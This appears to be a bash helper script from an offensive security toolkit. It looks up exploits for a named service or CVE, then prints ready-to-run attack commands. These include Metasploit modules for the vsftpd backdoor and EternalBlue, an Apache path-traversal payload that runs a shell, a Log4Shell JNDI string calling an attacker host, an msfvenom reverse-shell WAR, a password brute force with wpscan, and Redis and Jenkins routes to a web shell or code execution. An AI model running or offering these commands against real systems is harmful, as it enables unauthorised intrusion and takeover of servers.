#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════
# ZUZU RESEARCH HELPER
# ═══════════════════════════════════════════════════════════════
# When you don't know how to exploit something, run this.
# It searches for exploits and vulnerability info.
#
# Usage:
#   bash scripts/research.sh <service> <version>
#   bash scripts/research.sh <CVE-ID>
#   bash scripts/research.sh <search terms>
#
# Examples:
#   bash scripts/research.sh apache 2.4.49
#   bash scripts/research.sh CVE-2021-44228
#   bash scripts/research.sh "wordpress plugin vulnerable"
#   bash scripts/research.sh vsftpd 2.3.4
# ═══════════════════════════════════════════════════════════════

set -e

QUERY="${*}"

if [ -z "$QUERY" ]; then
  echo "Usage: bash scripts/research.sh <service version | CVE | search terms>"
  echo ""
  echo "Examples:"
  echo "  bash scripts/research.sh apache 2.4.49"
  echo "  bash scripts/research.sh CVE-2021-44228"
  echo "  bash scripts/research.sh vsftpd 2.3.4"
  exit 1
fi

echo "╔══════════════════════════════════════════════════════╗"
echo "║  🔍 ZUZU RESEARCH: $QUERY"
echo "╚══════════════════════════════════════════════════════╝"
echo ""

# ─── 1. SearchSploit (local exploit database) ────────────────
echo "═══ SEARCHSPLOIT (Local Exploit DB) ═══"
if command -v searchsploit &>/dev/null; then
  searchsploit "$QUERY" 2>/dev/null || echo "[!] No results in searchsploit"
else
  echo "[!] searchsploit not installed. Run: sudo apt install exploitdb"
fi
echo ""

# ─── 2. Nmap Scripts ─────────────────────────────────────────
echo "═══ NMAP SCRIPTS ═══"
ls /usr/share/nmap/scripts/ 2>/dev/null | grep -i "${QUERY%% *}" | head -10 || echo "[*] No matching nmap scripts"
echo ""

# ─── 3. Metasploit Search ────────────────────────────────────
echo "═══ METASPLOIT MODULES ═══"
if command -v msfconsole &>/dev/null; then
  msfconsole -q -x "search $QUERY; exit" 2>/dev/null | head -30 || echo "[!] Metasploit search failed"
else
  echo "[!] msfconsole not installed"
fi
echo ""

# ─── 4. Check if it's a CVE ──────────────────────────────────
if echo "$QUERY" | grep -qi "CVE-"; then
  echo "═══ CVE DETAILS ═══"
  CVE=$(echo "$QUERY" | grep -oP 'CVE-\d{4}-\d+')
  echo "[*] Looking up $CVE..."
  echo "[*] Check: https://www.cvedetails.com/cve/$CVE/"
  echo "[*] Check: https://nvd.nist.gov/vuln/detail/$CVE"
  echo "[*] Check: https://exploit-db.com/search?cve=$CVE"
  echo ""
fi

# ─── 5. Known Exploit Quick Check ────────────────────────────
echo "═══ QUICK EXPLOIT SUGGESTIONS ═══"

LOWER_QUERY="${QUERY,,}"

# Common vulnerable services with known exploits
case "$LOWER_QUERY" in
  *vsftpd*2.3.4*)
    echo "[!] KNOWN BACKDOOR: vsftpd 2.3.4 has a backdoor!"
    echo "    msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS TARGET; run'"
    ;;
  *eternalblue*|*ms17-010*|*smb*445*windows*)
    echo "[!] Try EternalBlue (MS17-010):"
    echo "    msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS TARGET; run'"
    ;;
  *apache*2.4.49*|*apache*2.4.50*)
    echo "[!] KNOWN RCE: Apache 2.4.49/2.4.50 Path Traversal (CVE-2021-41773)"
    echo "    curl 'http://TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'echo; id'"
    ;;
  *log4j*|*log4shell*|*CVE-2021-44228*)
    echo "[!] Log4Shell (CVE-2021-44228):"
    echo '    Inject: ${jndi:ldap://ATTACKER/a}'
    echo "    In any input field, User-Agent, or parameter"
    ;;
  *tomcat*|*apache*tomcat*)
    echo "[*] Try default credentials: tomcat:tomcat, admin:admin, manager:manager"
    echo "    Access /manager/html with creds"
    echo "    Upload .war file: msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war -o shell.war"
    ;;
  *wordpress*|*wp*)
    echo "[*] WordPress detected:"
    echo "    wpscan --url http://TARGET --enumerate vp,vt,u,dbe"
    echo "    wpscan --url http://TARGET -U admin -P /usr/share/wordlists/rockyou.txt"
    ;;
  *jenkins*)
    echo "[*] Jenkins:"
    echo "    Check /script for Groovy console (RCE if accessible)"
    echo '    Groovy: "whoami".execute().text'
    ;;
  *redis*|*6379*)
    echo "[*] Redis:"
    echo "    redis-cli -h TARGET"
    echo "    Try: CONFIG SET dir /var/www/html"
    echo "    Then write a web shell"
    ;;
  *smb*|*samba*)
    echo "[*] SMB/Samba:"
    echo "    enum4linux -a TARGET"
    echo "    smbclient -L //TARGET -N"
    echo "    searchsploit samba VERSION"
    ;;
  *)
    echo "[*] No quick exploit known for '$QUERY'"
    echo "[*] Suggestions:"
    echo "    1. searchsploit $QUERY"
    echo "    2. Google: '$QUERY exploit'"
    echo "    3. Check exploit-db.com"
    echo "    4. Run: nuclei -u http://TARGET -t cves/"
    ;;
esac

echo ""
echo "═══ RESEARCH COMPLETE ═══"
